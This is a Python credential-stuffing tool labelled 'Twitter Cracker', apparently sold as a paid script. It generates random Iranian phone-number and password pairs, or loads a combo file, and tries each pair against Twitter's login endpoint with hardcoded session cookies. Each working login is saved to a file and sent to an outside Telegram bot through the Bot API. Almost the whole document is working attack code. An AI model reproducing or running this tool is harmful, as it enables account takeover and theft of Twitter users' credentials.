try:
	import os,sys,time,requests,json
	import random 
	from time import sleep
	from user_agent import generate_user_agent
except ImportError:
	os.system('pip install requests')
	os.system('pip install user_agent')
	

#----------------------------------------------------[colors]----------------------------------------------------#
A = "\033[1;91m"
B = "\033[1;90m"
C = "\033[1;97m"
E = "\033[1;92m"
H = "\033[1;93m"
K = "\033[1;94m"
L = "\033[1;95m"
CC = "\033[1;96m"
Q = "("
W = ")"
s=requests.Session()
#----------------------------------------------------[Banner]----------------------------------------------------#
Sidra= """ 
\33[1;34m##     ##    ###    ########  ##    ## 
\33[1;37m###   ###   ## ##   ##     ## ##   ##  
\33[1;34m#### ####  ##   ##  ##     ## ##  ##   
\33[1;37m## ### ## ##     ## ########  #####    
\33[1;34m##     ## ######### ##   ##   ##  ##   
\33[1;37m##     ## ##     ## ##    ##  ##   ##  
\33[1;34m##     ## ##     ## ##     ## ##    ##                                                       

\033[1;36m------------------------\033[1;36m------------------------
\033[1;31m\x1b[1;96m   Author \x1b[1;96m     ➵ \x1b[1;96m    MARK CORNEL
\033[1;31m\x1b[1;96m   Facebook\x1b[1;96m    ➵  \x1b[1;96m   MARK BTC
\033[1;31m\x1b[1;96m   GitHub\x1b[1;96m      ➵ \x1b[1;96m    GUPTA-SHAKEL
\033[1;31m\x1b[1;96m   Tool\x1b[1;96m        ➵ \x1b[1;96m    [\x1b[1;92mTwitter Cracker\x1b[1;96m]
\033[1;31m\x1b[1;96m   Version\x1b[1;96m     ➵ \x1b[1;96m    0.3
\033[1;36m------------------------\033[1;36m------------------------
""" 
Tk = f""" {C}

\033[31m███╗   ███╗ █████╗ ██████╗ ██╗  ██╗
\33[35m████╗ ████║██╔══██╗██╔══██╗██║ ██╔╝
\033[35m██╔████╔██║███████║██████╔╝█████╔╝ 
\33[1;31m██║╚██╔╝██║██╔══██║██╔══██╗██╔═██╗ 
\33[1;31m██║ ╚═╝ ██║██║  ██║██║  ██║██║  ██╗
\33[1;31m╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝\33[1;32m TWITTER
            
\033[1;93m < \033[1;92mTHE TOOL IS PAID\033[1;93m >  \033[1;91m 
 ---------------------------
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mAUTHOR     : MARK CORNEL
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mTelegram   : MARK-TECH
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mYOUTUBE    : MARK-TECHNOLOGY
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mGITHUB     : GITHUB.COM/UNKNOWN
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mTOOL       : TWITTER CRACK
""" 
os.system('clear')

def Top(s):
	for ASU in s + '\n':
		sys.stdout.write(ASU)
		sys.stdout.flush()
		sleep(50. / 700)
		
re = requests.get("https://pastebin.com/raw/N0gnRNQ4")
print (Sidra)
print ("\033[1;92mFIRST STEP OF LOGIN")
print ("\033[1;97m--------------------")
print ("\033[1;97m ") 
password = input('          \033[1;93mTOOL PASSWORD: '+C)
print (E)
if password == "" :
  sys.exit()
if password in str(re.text):
  print(H+" FIRST STEP Is Done. Logged in Successfully as ")
  print ("\033[1;93m ")
  print("\033[1;93mPlease Wait 5 Minutes, All Packages Are Checking.....")
else:
  print (" Wrong Password ⌯")
  os.system('xdg-open https://wa.me/+2347013107449')
  sys.exit()
#----------------------------------------------------[MARK_TECH_Checker]----------------------------------------------------#  
os.system('clear')
os.system('rm -rf .txt')
print(Sidra)
token = input(A+"("+E+"⌯"+A+")"+H+ " Enter Token :\n"+C)
ID = input(A+"("+E+"⌯"+A+")"+H+ " Enter ID Tele :\n"+C)
def Cod_SidraELEzz():
	os.system('clear')
	global ID, token 
	ok = 0
	cp = 0
	sk = 0
	print(Tk)
	print("\n"+A+"("+E+"1"+A+")"+C+ " Random Checker Twitter \n"+A+"("+E+"2"+A+")"+C+ " Combo Checker Twitter")
	SidraELEzz=input("\n"+A+"("+E+"⌯"+A+")"+B+ " Choose Checker :"+C)
	if SidraELEzz=="1":
		os.system('clear')
		import time
		def Combo():
			for lik in range(2500):
				kk=random.randint(1000000, 9999999)
				ss=("+98916"+str(kk)+":0916"+str(kk))
				with open(".txt", "a") as Sidr:
					Sidr.write(str(ss)+"\n")
				x2=random.randint(1000000, 9999999)
				sos=("+98917"+str(x2)+":0917"+str(x2))
				with open(".txt", "a") as Sidr:
					Sidr.write(str(sos)+"\n")
				sk=random.randint(1000000, 9999999)
				ko=("+98918"+str(sk)+":0918"+str(sk))
				with open(".txt", "a") as Sidr:
					Sidr.write(str(ko)+"\n")
				ma=random.randint(1000000, 9999999)
				zki=("+98990"+str(ma)+":0990"+str(ma))
				with open(".txt", "a") as Sidr:
					Sidr.write(str(zki)+"\n")
		Combo()
		fil=".txt"
		file=open(fil,"r").read().splitlines()
		for line in file:
			user=line.split(':')[0]
			pw=line.split(':')[1]
			timee = time.asctime()
			Sidraok = ("👩‍💻➥ • ᴛᴡɪᴛᴛᴇʀ ᴀᴄᴄᴏᴜɴᴛ ✓\n. — — — — —  — — — — — . \n📩 ➥• ᴇᴍᴀɪʟ : "+str(user)+"\n📟 ➥• ᴘᴀѕѕᴡᴏʀᴅ : "+str(pw)+"\n⏱ ➥• ᴛɪᴍᴇ : "+str(timee)+"\n. — — — — —  — — — — — . \n👩‍💻➥• @marktechf")
			headers={
		    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
		    'Accept-Encoding': 'gzip, deflate, br',
		    'Accept-Language': 'ar,en-US;q=0.7,en;q=0.3',
		    'Content-Length': '901',
		    'Content-Type': 'application/x-www-form-urlencoded',
		    'Cookie': 'personalization_id="v1_aFGvGiam7jnp1ks4ml5SUg=="; guest_id=v1%3A161776685629025416; gt=1379640315083112449; ct0=de4b75112a3f496676a1b2eb0c95ef65; _twitter_sess=BAh7CSIKZmxhc2hJQzonQWN0aW9uQ29udHJvbGxlcjo6Rmxhc2g6OkZsYXNo%250ASGFzaHsABjoKQHVzZWR7ADoPY3JlYXRlZF9hdGwrCIA8a6p4AToMY3NyZl9p%250AZCIlM2RlMDA1MzYyNmJiMGQwYzQ1OGU2MjFhODY5ZGU5N2Y6B2lkIiU4ODM0%250AMjM5OTNlYjg0ZGExNzRiYTEwMWE0M2ZhYTM0Mw%253D%253D--f5b0bce9df3870f1a221ae914e684fbdc533d03d; external_referer=padhuUp37zjgzgv1mFWxJ12Ozwit7owX|0|8e8t2xd8A2w%3D; _mb_tk=10908ac0975311eb868c135992f7d397',
		    'Host': 'twitter.com',
		   'Origin': 'https://twitter.com',
		   'Referer': 'https://twitter.com/login?lang=ar',
		   'TE': 'Trailers',
		   'Upgrade-Insecure-Requests': '1',
		   'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0', }
			data={
		    'redirect_after_login': '/',
		    'remember_me': '1',
		    'authenticity_token': '10908ac0975311eb868c135992f7d397',
		    'wfa': '1',
		   'ui_metrics': '{\"rf\":{\"ab4c9cdc2d5d097a5b2ccee53072aff6d2b5b13f71cef1a233ff378523d85df3\":1,\"a51091a0c1e2864360d289e822acd0aa011b3c4cabba8a9bb010341e5f31c2d2\":84,\"a8d0bb821f997487272cd2b3121307ff1e2e13576a153c3ba61aab86c3064650\":-1,\"aecae417e3f9939c1163cbe2bde001c0484c0aa326b8aa3d2143e3a5038a00f9\":84},\"s\":\"MwhiG0C4XblDIuWnq4rc5-Ua8dvIM0Z5pOdEjuEZhWsl90uNoC_UbskKKH7nds_Qdv8yCm9Np0hTMJEaLH8ngeOQc5G9TA0q__LH7_UyHq8ZpV2ZyoY7FLtB-1-Vcv6gKo40yLb4XslpzJwMsnkzFlB8YYFRhf6crKeuqMC-86h3xytWcTuX9Hvk7f5xBWleKfUBkUTzQTwfq4PFpzm2CCyVNWfs-dmsED7ofFV6fRZjsYoqYbvPn7XhWO1Ixf11Xn5njCWtMZOoOExZNkU-9CGJjW_ywDxzs6Q-VZdXGqqS7cjOzD5TdDhAbzCWScfhqXpFQKmWnxbdNEgQ871dhAAAAXiqazyE\"}',
		   'session[username_or_email]': user,
		   'session[password]': pw}
			
			try:
				req=requests.post(f'https://twitter.com/sessions',headers=headers,data=data)
				time.sleep(0.5)
				if ("ct0") in req.cookies:
					os.system('clear')
					print(Tk)
					ok+=1
					sk+=1
					print(A+"("+E+user+A+")"+H+" : "+A+"("+E+pw+A+")")
					print(A+"-----------------------------------")
					print("{}({}-{}){}  Test {} : {}90000".format(A,H,A,B,A,H))
					print("{}({}-{}){}  Good {} : {}{}".format(A,E,A,E,A,E,str(ok)))
					print("{}({}-{}){}  Baad {} : {}{}".format(A,K,A,K,A,K,str(cp)))
					print(A+"-----------------------------------")
					print(H+"Telegram  "+A+" : "+E+"@marktechf")
					
					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(Sidraok))
					f=open('Ok.txt','a')
					f.write(Sidraok)
					f.close()
				else:
					os.system('clear')
					print(Tk)
					cp+=1
					print(A+"("+E+user+A+")"+H+" : "+A+"("+E+pw+A+")")
					print(A+"-----------------------------------")
					print("{}({}-{}){}  Test {} : {}90000".format(A,H,A,B,A,H))
					print("{}({}-{}){}  Good {} : {}{}".format(A,E,A,E,A,E,str(ok)))
					print("{}({}-{}){}  Baad {} : {}{}".format(A,K,A,K,A,K,str(cp)))
					print(A+"-----------------------------------")
					print(H+"Telegram  "+A+" : "+E+"@marktechf")
			except requests.exceptions.ConnectionError:
				print()
				
			except KeyboardInterrupt:
				exit(0)
	elif SidraELEzz=="2":
		os.system('clear')
		import time
		try:
			print(Tk)
			fil= input(A+"("+E+"⌯"+A+")"+H+ " Enter the file Combo :"+C)
		except:
			print("\n Error !!!!!!!!!")
			os.sys.exit()
		file=open(fil,"r").read().splitlines()
		for line in file:
			user=line.split(':')[0]
			pw=line.split(':')[1]
			timee = time.asctime()
			Sidraok = ("👩‍💻➥ • ᴛᴡɪᴛᴛᴇʀ ᴀᴄᴄᴏᴜɴᴛ ✓\n. — — — — —  — — — — — . \n📩 ➥• ᴇᴍᴀɪʟ : "+str(user)+"\n📟 ➥• ᴘᴀѕѕᴡᴏʀᴅ : "+str(pw)+"\n⏱ ➥• ᴛɪᴍᴇ : "+str(timee)+"\n. — — — — —  — — — — — . \n👩‍💻➥• @marktechf")
			headers={
		    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
		    'Accept-Encoding': 'gzip, deflate, br',
		    'Accept-Language': 'ar,en-US;q=0.7,en;q=0.3',
		    'Content-Length': '901',
		    'Content-Type': 'application/x-www-form-urlencoded',
		    'Cookie': 'personalization_id="v1_aFGvGiam7jnp1ks4ml5SUg=="; guest_id=v1%3A161776685629025416; gt=1379640315083112449; ct0=de4b75112a3f496676a1b2eb0c95ef65; _twitter_sess=BAh7CSIKZmxhc2hJQzonQWN0aW9uQ29udHJvbGxlcjo6Rmxhc2g6OkZsYXNo%250ASGFzaHsABjoKQHVzZWR7ADoPY3JlYXRlZF9hdGwrCIA8a6p4AToMY3NyZl9p%250AZCIlM2RlMDA1MzYyNmJiMGQwYzQ1OGU2MjFhODY5ZGU5N2Y6B2lkIiU4ODM0%250AMjM5OTNlYjg0ZGExNzRiYTEwMWE0M2ZhYTM0Mw%253D%253D--f5b0bce9df3870f1a221ae914e684fbdc533d03d; external_referer=padhuUp37zjgzgv1mFWxJ12Ozwit7owX|0|8e8t2xd8A2w%3D; _mb_tk=10908ac0975311eb868c135992f7d397',
		    'Host': 'twitter.com',
		   'Origin': 'https://twitter.com',
		   'Referer': 'https://twitter.com/login?lang=ar',
		   'TE': 'Trailers',
		   'Upgrade-Insecure-Requests': '1',
		   'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0', }
			data={
		    'redirect_after_login': '/',
		    'remember_me': '1',
		    'authenticity_token': '10908ac0975311eb868c135992f7d397',
		    'wfa': '1',
		   'ui_metrics': '{\"rf\":{\"ab4c9cdc2d5d097a5b2ccee53072aff6d2b5b13f71cef1a233ff378523d85df3\":1,\"a51091a0c1e2864360d289e822acd0aa011b3c4cabba8a9bb010341e5f31c2d2\":84,\"a8d0bb821f997487272cd2b3121307ff1e2e13576a153c3ba61aab86c3064650\":-1,\"aecae417e3f9939c1163cbe2bde001c0484c0aa326b8aa3d2143e3a5038a00f9\":84},\"s\":\"MwhiG0C4XblDIuWnq4rc5-Ua8dvIM0Z5pOdEjuEZhWsl90uNoC_UbskKKH7nds_Qdv8yCm9Np0hTMJEaLH8ngeOQc5G9TA0q__LH7_UyHq8ZpV2ZyoY7FLtB-1-Vcv6gKo40yLb4XslpzJwMsnkzFlB8YYFRhf6crKeuqMC-86h3xytWcTuX9Hvk7f5xBWleKfUBkUTzQTwfq4PFpzm2CCyVNWfs-dmsED7ofFV6fRZjsYoqYbvPn7XhWO1Ixf11Xn5njCWtMZOoOExZNkU-9CGJjW_ywDxzs6Q-VZdXGqqS7cjOzD5TdDhAbzCWScfhqXpFQKmWnxbdNEgQ871dhAAAAXiqazyE\"}',
		   'session[username_or_email]': user,
		   'session[password]': pw}
			
			try:
				req=requests.post(f'https://twitter.com/sessions',headers=headers,data=data)
				time.sleep(0.5)
				if ("ct0") in req.cookies:
					os.system('clear')
					print(Tk)
					ok+=1
					sk+=1
					print(A+"("+E+user+A+")"+H+" : "+A+"("+E+pw+A+")")
					print(A+"-----------------------------------")
					print("{}({}-{}){}  Test {} : {}90000".format(A,H,A,B,A,H))
					print("{}({}-{}){}  Good {} : {}{}".format(A,E,A,E,A,E,str(ok)))
					print("{}({}-{}){}  Baad {} : {}{}".format(A,K,A,K,A,K,str(cp)))
					print(A+"-----------------------------------")
					print(H+"Telegram  "+A+" : "+E+"@marktechf")
					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(Sidraok))
					f=open('Ok.txt','a')
					f.write(Sidraok)
					f.close()
				else:
					os.system('clear')
					print(Tk)
					cp+=1
					sk+=1
					print(A+"("+E+user+A+")"+H+" : "+A+"("+E+pw+A+")")
					print(A+"-----------------------------------")
					print("{}({}-{}){}  Test {} : {}90000".format(A,H,A,B,A,H))
					print("{}({}-{}){}  Good {} : {}{}".format(A,E,A,E,A,E,str(ok)))
					print("{}({}-{}){}  Baad {} : {}{}".format(A,K,A,K,A,K,str(cp)))
					print(A+"-----------------------------------")
					print(H+"Telegram  "+A+" : "+E+"@marktechf")
			except requests.exceptions.ConnectionError:
				print()
				
			except KeyboardInterrupt:
				exit(0)
Cod_SidraELEzz()


 
